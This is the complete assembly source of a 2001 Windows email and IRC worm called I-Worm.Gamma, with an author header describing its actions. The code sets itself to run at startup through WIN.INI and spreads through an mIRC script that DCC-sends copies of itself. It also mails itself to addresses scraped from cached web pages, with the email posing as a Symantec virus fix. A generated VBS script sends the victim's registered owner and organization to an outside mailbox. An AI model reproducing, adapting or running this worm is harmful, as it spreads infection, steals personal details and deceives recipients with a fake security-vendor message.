; comment #
; Name : I-Worm.Gamma (w32gammaworm)
; Author : PetiK
; Date : May 29th - June 9th
; Size : 8704 bytes
; 
; Action : Check if the file is /WINDOWS/SYSTEM.SETUP.EXE. Whether it's not this file, it will
; copies to /WINDOWS/SYSTEM.SETUP.EXE. It alters the run= line in the Win.ini file to the name
; of the copy. It displays a message.
; Otherwise, he create C:\gamma and copies it to C:\mirc, C:\mirc32, C:\progra~1\mirc or
; C:\progra~1\mirc32. After, it creates C:\Data and put a file info.vbs. This file send a message
; to gamma@multimania.com :     Subject : Message from + Name of the registered user
;               Body    : Time, Date, Organization      I-Worm.Gamma
; 
; On the 5th, when the day is Wednesday, a message is displayed. When the user click on "OK", the
; worm swap the buttons of the mouse.
; 
; The worms waits for an active Internet connection and tries to establish one by attemping to
; www.symantec.com. When the connection is successful, it scans all *.*htm* file in "Temporary
; Inetrnet Files" to find email adresses. When the worms finds it, it sends a copy of him to the
; address :
;   From : snd @symantec.com
;   Date : 06/06/2001
;   Subject : Virus/Worms Fix from Symantec Corporation (Norton Antivirus)
;   Body :  Hi,
;       Symantec Corporation send you the last version of our tool Virus/Worms Fix.
;       Here is the version 3.1 .
;       This tool detect, repair and protect users against Bloodhound.IRC.Worm,
;       Bloodhound.VBS.Worm, Bloodhound.W32 and Bloodhound.WordMacro .
; 
;               With Regards,
;               Symantec Corporation (http://www.symantec.com)
;   Attachment : SETUP.EXE
; 
; #


.586p
.model flat,stdcall

include useful.inc

extrn   CloseHandle:PROC
extrn   CopyFileA:PROC
extrn   CreateDirectoryA:PROC
extrn   CreateFileA:PROC
extrn   CreateFileMappingA:PROC
extrn   DeleteFileA:PROC
extrn   ExitProcess:PROC
extrn   FindClose:PROC
extrn   FindFirstFileA:PROC
extrn   FindNextFileA:PROC
extrn   gethostbyname:PROC
extrn   GetFileSize:PROC
extrn   GetModuleFileNameA:PROC
extrn   GetModuleHandleA:PROC
extrn   GetSystemDirectoryA:PROC
extrn   GetSystemTime:PROC
extrn   GetWindowsDirectoryA:PROC
extrn   lstrcat:PROC
extrn   lstrcmp:PROC
extrn   MAPILogoff:PROC
extrn   MAPILogon:PROC
extrn   MAPISendMail:PROC
extrn   MapViewOfFile:PROC
extrn   MessageBoxA:PROC
extrn   RegCloseKey:PROC
extrn   RegOpenKeyExA:PROC
extrn   RegQueryValueExA:PROC
extrn   SetCurrentDirectoryA:PROC
extrn   Sleep:PROC
extrn   SwapMouseButton:PROC
extrn   UnmapViewOfFile:PROC
extrn   WinExec:PROC
extrn   WriteFile:PROC
extrn   WritePrivateProfileStringA:PROC


.data
szComName   db 50 dup (0)
szOrig      db 50 dup (0)
szWinini    db 50 dup (0)
szTif       db 7Fh dup (0)

FileHandle  dd ?
RegHandle   dd ?
SrchHandle  dd ?
octets      dd ?
ValueType   dd 0
mail_address    db 128 dup (?)
MAPISession dd 0

DIR     db "C:\Data",00h
information db "C:\Data\info.vbs",00h
infoexec    db "wscript C:\Data\info.vbs",00h
mirc        db "C:\gamma",00h
script1     db "C:\mirc\script.ini",00h
script2         db "C:\mirc32\script.ini",00h
script3     db "C:\progra~1\mirc\script.ini",00h
script4     db "C:\progra~1\mirc32\script.ini",00h
Copie           db "\SETUP.EXE",00h
Winini      db "\\WIN.INI",00h
run     db "run",00h
windows     db "windows",00h
TEXTE       db "This file does not appear to be a Win32 valid file. ",00h
TITRE2      db "I-Worm.Gamma (c)2001",00h
TEXTE2      db "PetiK greets you",00h
symantec    db "www.symantec.com",00h
tempnetfile db "\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders",00h
Value       db "Cache",00h
FICHIER     db "*.*htm*",00h

CREATE_NEW      equ 00000001h
CREATE_ALWAYS       equ 00000002h
FILE_ATTRIBUTE_READONLY equ 00000001h
FILE_ATTRIBUTE_NORMAL   equ 00000080h
FILE_MAP_READ       equ 00000004h
FILE_SHARE_READ     equ 00000001h
GENERIC_READ        equ 80000000h
GENERIC_WRITE       equ 40000000h
HKEY_USERS      equ 80000003h
KEY_QUERY_VALUE     equ 00000001h
KEY_SET_VALUE       equ 00000002h
MAX_PATH        equ 260
OPEN_EXISTING       equ 00000003h
PAGE_READONLY       equ 00000002h
REG_SZ          equ 00000001h

SYSTIME struct
wYear       WORD ?
wMonth      WORD ?
wDayOfWeek  WORD ?
wDay        WORD ?
wHour       WORD ?
wMinute     WORD ?
wSecond     WORD ?
wMillisecond    WORD ?
SYSTIME ends
SystemTime      SYSTIME <>

time    struc
    LowDateTime dd ?
    HighDateTime    dd ?
time    ends
win32   struc
    FileAttributes  dd ?
    CreationTime    time ?
    LastAccessTime  time ?
    LastWriteTime   time ?
    FileSizeHifh    dd ?
    FileSizeLow dd ?
    Reserved0   dd ?
    Reserved1   dd ?
    FileName    dd MAX_PATH (?)
    AlternativeFileName db 13 dup (?)
                        db 3 dup (?)
win32   ends
CHERCHE     win32 <>


mircd:  db "[script]",0dh,0ah
    db ";Don't delete this file",0dh,0ah
    db "n0=ON 1:JOIN:#:{",0dh,0ah
    db "n1= /if ( $nick == $me ) { halt }",0dh,0ah
    db "n2= /.dcc send $nick "
szCopie     db 50 dup (0)
    db "",0dh,0ah
    db "n3=}",0dh,0ah
MIRCTAILLE  equ $-mircd

infod:  db ''' Symantec ScriptBlocking Authenticated File',0dh,0ah
    db ''' A3C7B6E0-5535-11D5-911D-444553546170',0dh,0ah
    db '',0dh,0ah
    db 'On Error Resume Next',0dh,0ah
    db 'set f=CreateObject("Scripting.FileSystemObject")',0dh,0ah
    db 'set w=CreateObject("WScript.Shell")',0dh,0ah
    db 'If w.RegRead("HKLM\Software\Gamma\") <> "OK" Then',0dh,0ah
    db 'set o=CreateObject("Outlook.Application")',0dh,0ah
    db 'set m=o.CreateItem(0)',0dh,0ah
    db 'n=w.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")',0dh,0ah
    db 'p=w.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization")',0dh,0ah
    db 'm.To = "gammaworm@multimania.com"',0dh,0ah
    db 'm.Subject = "Message from " & n',0dh,0ah
    db 's = "Time : " & time',0dh,0ah
        db 's = s & vbCrLf & "Date : " & date',0dh,0ah
    db 's = s & vbCrLf & "Organization : " & p',0dh,0ah
    db 's = s & vbCrLf & vbCrLf & "     I-Worm.Gamma"',0dh,0ah
    db 'm.Body = s',0dh,0ah
    db 'm.DeleteAfterSubmit=True',0dh,0ah
    db 'm.Send',0dh,0ah
    db 'w.RegWrite "HKLM\Software\Gamma\", "OK"',0dh,0ah
    db 'End If',0dh,0ah
INFOTAILLE  equ $-infod


Email   dd ?
    dd offset Subject
    dd offset Message
    dd ?
    dd offset DateS
    dd ?
    dd 2
    dd offset MelFrom
    dd 1
    dd offset MelTo
    dd 1
    dd offset Attach

MelFrom dd ?
    dd ?
    dd offset MelFrom
    dd offset sAddr
    dd ?
    dd ?

MelTo   dd ?
    dd 1
    dd offset MelTo
    dd offset mail_address
    dd ?
    dd ?

Attach  dd ?
    dd ?
    dd ?
    dd offset szOrig
    dd ?
    dd ?


Subject db "Virus/Worms Fix from Symantec Corporation (Norton Antivirus)",00h
Message db "Hi,",0dh,0ah,0dh,0ah
    db "Symantec Corporation send you the last version of our tool Virus/Worms Fix. "
    db "Here is the version 3.1 .",0dh,0ah
    db "This tool detect, repair and protect users against Bloodhound.IRC.Worm, "
    db "Bloodhound.VBS.Worm, Bloodhound.W32 and Bloodhound.WordMacro .",0dh,0ah,0dh,0ah
    db 09h,09h,"With Regards,",0dh,0ah
    db 09h,09h,"Symantec Corporation (http://www.symantec.com)",00h
DateS   db "06/06/2001",00h
sAddr   db "snd@symantec.com",00h


.code
DEBUT:
VERIF:  push 00h
    call GetModuleHandleA
    push 50
    push offset szOrig
    push eax
    call GetModuleFileNameA

    push 50h
    push offset szCopie
        call GetSystemDirectoryA
        push offset Copie
        push offset szCopie
        call lstrcat

    push offset szOrig
    push offset szCopie
    call lstrcmp
    test eax,eax
        jz   MIRC

COPIE:  push 00h
    push offset szCopie
    push offset szOrig
    call CopyFileA

WININI: push 50
    push offset szWinini
    call GetWindowsDirectoryA
    push offset Winini
    push offset szWinini
    call lstrcat
    push offset szWinini
    push offset szCopie
    push offset run
    push offset windows
    call WritePrivateProfileStringA

MESSAGE:push 1010h
    push offset szOrig
    push offset TEXTE
    push 00h
    call MessageBoxA
        jmp  FIN

MIRC:   push 00h
    push FILE_ATTRIBUTE_READONLY
    push CREATE_ALWAYS
    push 00h
    push FILE_SHARE_READ
    push GENERIC_WRITE
    push offset mirc
    call CreateFileA
    mov  [FileHandle],eax
    push 00h
    push offset octets
    push MIRCTAILLE
    push offset mircd
    push [FileHandle]
    call WriteFile
    push [FileHandle]
    call CloseHandle
C_MIRC: push 00h
    push offset script1
    push offset mirc
    call CopyFileA
    push 00h
    push offset script2
    push offset mirc
    call CopyFileA
    push 00h
    push offset script3
    push offset mirc
    call CopyFileA
    push 00h
    push offset script4
    push offset mirc
    call CopyFileA

INFO:   push offset DIR
    call CreateDirectoryA
    push 00h    
    push FILE_ATTRIBUTE_NORMAL
    push CREATE_NEW
    push 00h
    push FILE_SHARE_READ
    push GENERIC_WRITE
    push offset information
    call CreateFileA
    cmp  eax,-1
    je   DATE
    mov  [FileHandle],eax
    push 00h
    push offset octets
    push INFOTAILLE
    push offset infod
    push [FileHandle]
    call WriteFile
    push [FileHandle]
    call CloseHandle
    push 01h
    push offset infoexec
    call WinExec

DATE:   push offset SystemTime
    call GetSystemTime
    cmp  [SystemTime.wDayOfWeek],03h
    jne  NET
    cmp  [SystemTime.wDay],05h
    jne  NET
    push 40h
    push offset TITRE2
    push offset TEXTE2
    push 00h
    call MessageBoxA
    push 01h
    call SwapMouseButton
    jmp  NET

PAUSE:  push 60 * 3 * 1000
    call Sleep

NET:    push offset symantec
    call gethostbyname
    test eax,eax
    jz   PAUSE

TIF:    push offset RegHandle
    push KEY_QUERY_VALUE
    push 00h
    push offset tempnetfile
    push HKEY_USERS
    call RegOpenKeyExA
    test eax,eax
    jnz  FIN

    push 7Fh
    push offset szTif
    push offset ValueType
    push 00h
    push offset Value
    push [RegHandle]
    call RegQueryValueExA

    push [RegHandle]
    call RegCloseKey

TIFCH:  push offset szTif
    call SetCurrentDirectoryA

FFF:    push offset CHERCHE
    push offset FICHIER
    call FindFirstFileA
    cmp  eax,-1
    je   FC
    mov  [SrchHandle],eax
cHTML:  call HTML
FNF:    push offset CHERCHE
    push [SrchHandle]
    call FindNextFileA
    dec  eax
    jnz  cHTML
FC: push [SrchHandle]
    call FindClose

END_S:  popad

FIN:    push 00h
    call ExitProcess

HTML:   pushad
    push 00h
    push FILE_ATTRIBUTE_NORMAL
    push OPEN_EXISTING
    push 00h
    push FILE_SHARE_READ
    push GENERIC_READ
    push offset CHERCHE.FileName
    call CreateFileA
    inc  eax
    je   END_S
    dec  eax
    xchg eax,ebx

    xor  eax,eax
    push eax
    push eax
    push eax
    push PAGE_READONLY
    push eax
    push ebx
    call CreateFileMappingA
    test eax,eax
    jz   FERME1

    xor  eax,eax
    push eax
    push eax
    push eax
    push FILE_MAP_READ
    push ebp
    call MapViewOfFile
    test eax,eax
    jz   FERME2
    xchg eax,esi

    push 00h
    push ebx
    call GetFileSize
    xchg eax,ecx
    jecxz FERME3

ls_s_m: call @mt
    db   'mailto:'
    @mt:    pop edi
l_s_m:  pushad
    push 07h
    pop  ecx
    rep  cmpsb
    popad
    je   s_m
    inc esi
    loop l_s_m

FERME3: push esi
    call UnmapViewOfFile
FERME2: push ebp
    call CloseHandle
FERME1: push ebx
    call CloseHandle
    popad
    ret

s_m:    xor  edx,edx
    add  esi,7
    mov  edi,offset mail_address
    push edi
n_c:    lodsb
    cmp  al,' '
    je   s_c
    cmp  al,'"'
    je   e_c
    cmp  al,''''
    je   e_c
    cmp  al,'@'
    jne  o_a
    inc  edx
o_a:    stosb
    jmp  n_c
s_c:    inc  esi
    jmp  n_c
e_c:    xor  al,al
    stosb
    pop  edi
    test edx,edx
    je   ls_s_m

mapiln: xor  eax,eax
    push dword ptr [MAPISession]
    push eax
    push eax
    push eax                     ; password
    push eax                     ; username
    push eax    
    call MAPILogon

mapism: xor  eax,eax
    push eax
    push eax
    push offset Email
    push eax
    push word ptr [MAPISession]
    call MAPISendMail

mapilf: xor  eax,eax
    push eax
    push eax
    push eax
    push dword ptr [MAPISession]
    call MAPILogoff

    jmp  ls_s_m



end DEBUT
